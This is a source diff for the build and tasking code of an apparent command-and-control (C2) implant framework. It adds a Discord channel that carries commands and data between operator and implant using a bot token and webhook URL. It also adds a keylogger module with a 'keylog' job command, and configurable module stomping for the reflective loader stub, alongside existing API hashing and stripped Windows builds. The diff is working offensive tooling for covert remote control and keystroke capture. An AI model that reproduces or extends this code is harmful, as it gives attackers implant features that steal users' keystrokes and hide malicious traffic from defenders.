@@ -290,14 +290,17 @@ type GenerateConfig struct {
 	ProxyUsername      string `json:"proxy_username"`
 	ProxyPassword      string `json:"proxy_password"`
 	RotationMode       string `json:"rotation_mode"`
+	ModuleStomp        bool   `json:"module_stomp"`
+	StompPaths         string `json:"stomp_paths"`
 }
 
 var (
-	ObjectDir_http = "objects_http"
-	ObjectDir_smb  = "objects_smb"
-	ObjectDir_tcp  = "objects_tcp"
-	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectDir_http    = "objects_http"
+	ObjectDir_smb     = "objects_smb"
+	ObjectDir_tcp     = "objects_tcp"
+	ObjectDir_dns     = "objects_dns"
+	ObjectDir_discord = "objects_discord"
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "Keylogger", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
@@ -308,6 +311,7 @@ var seedDependentFiles = map[string]bool{
 	"Boffer":     true,
 	"bof_loader": true,
 	"Commander":  true,
+	"Keylogger":  true,
 }
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
@@ -368,6 +372,9 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		encryptKey, err := hex.DecodeString(encrypt_key)
 		if err != nil {
 			return nil, err
+		}
+		if len(encryptKey) != 32 {
+			return nil, errors.New("encrypt_key must be 32 bytes (64 hex chars) for AES-256-GCM")
 		}
 
 		params = append(params, int(agentWatermark))
@@ -503,6 +510,19 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				return nil, err
 			}
 
+		case "discord":
+			webhookUrl, _ := listenerMap["webhook_url"].(string)
+			botToken, _ := listenerMap["bot_token"].(string)
+			channelTasksId, _ := listenerMap["channel_tasks_id"].(string)
+			pollInterval, _ := listenerMap["poll_interval"].(float64)
+			cleanup, _ := listenerMap["cleanup"].(bool)
+
+			params = append(params, webhookUrl)
+			params = append(params, botToken)
+			params = append(params, channelTasksId)
+			params = append(params, int(pollInterval))
+			params = append(params, cleanup)
+
 		default:
 			return nil, errors.New("protocol unknown")
 		}
@@ -607,6 +627,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	} else if protocol == "dns" {
 		ObjectDir = ObjectDir_dns
 		ConnectorFile = "ConnectorDNS"
+	} else if protocol == "discord" {
+		ObjectDir = ObjectDir_discord
+		ConnectorFile = "ConnectorDiscord"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -656,6 +679,8 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		beaconDefine = "-DBEACON_TCP"
 	case "dns":
 		beaconDefine = "-DBEACON_DNS"
+	case "discord":
+		beaconDefine = "-DBEACON_DISCORD"
 	}
 
 	recompileFiles := []string{ConnectorFile}
@@ -795,7 +820,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				"-DHASH_NTPROTECTVIRTUALMEMORY=0x%x -DHASH_NTCLOSE=0x%x "+
 				"-DHASH_LOADLIBRARYA=0x%x -DHASH_GETPROCADDRESS=0x%x "+
 				"-DHASH_FLUSHINSTRUCTIONCACHE=0x%x -DHASH_FREELIBRARY=0x%x "+
-				"-DHASH_LOADLIBRARYEXA=0x%x -DMODULE_STOMP",
+				"-DHASH_LOADLIBRARYEXA=0x%x",
 				seed,
 				stubHashes.ModNtdll, stubHashes.ModKernel32,
 				stubHashes.NtCreateSection, stubHashes.NtMapViewOfSection,
@@ -803,6 +828,25 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				stubHashes.LoadLibraryA, stubHashes.GetProcAddress,
 				stubHashes.FlushInstructionCache, stubHashes.FreeLibrary,
 				stubHashes.LoadLibraryExA)
+
+			if generateConfig.ModuleStomp && generateConfig.StompPaths != "" {
+				incPath := tempDir + "/stomp_paths.inc"
+				var incContent strings.Builder
+				incContent.WriteString("_stomp_paths:\n")
+				for _, line := range strings.Split(generateConfig.StompPaths, "\n") {
+					path := strings.TrimSpace(line)
+					if path == "" {
+						continue
+					}
+					escaped := strings.ReplaceAll(path, `\`, `\\`)
+					incContent.WriteString(fmt.Sprintf("    db \"%s\", 0\n", escaped))
+				}
+				incContent.WriteString("    db 0\n")
+				_ = os.WriteFile(incPath, []byte(incContent.String()), 0644)
+				nasmDefines += fmt.Sprintf(" -DMODULE_STOMP -I%s/", tempDir)
+				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Module stomping enabled")
+			}
+
 			nasmCmd := fmt.Sprintf("nasm -f bin %s %s -o %s", nasmDefines, nasmSrc, stubBinPath)
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Assembling reflective loader stub with per-payload hashes...")
 			var nasmArgs []string
@@ -1596,6 +1640,11 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 		array = []interface{}{COMMAND_UNLINK, int(id)}
 
+	case "keylog":
+		taskData.Type = adaptix.TASK_TYPE_JOB
+		pollInterval := 100
+		array = []interface{}{COMMAND_KEYLOG_START, pollInterval}
+
 	case "upload":
 		var fileName string
 		var localFile string
@@ -1965,6 +2014,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				}
 			}
 			task.Message = message
+
+		case COMMAND_KEYLOG_START:
+			task.Type = adaptix.TASK_TYPE_JOB
+			task.Completed = false
+			task.Message = "Keylogger started (use 'jobs kill' to stop)"
 
 		case COMMAND_JOB:
 			if false == packer.CheckPacker([]string{"byte", "byte"}) {
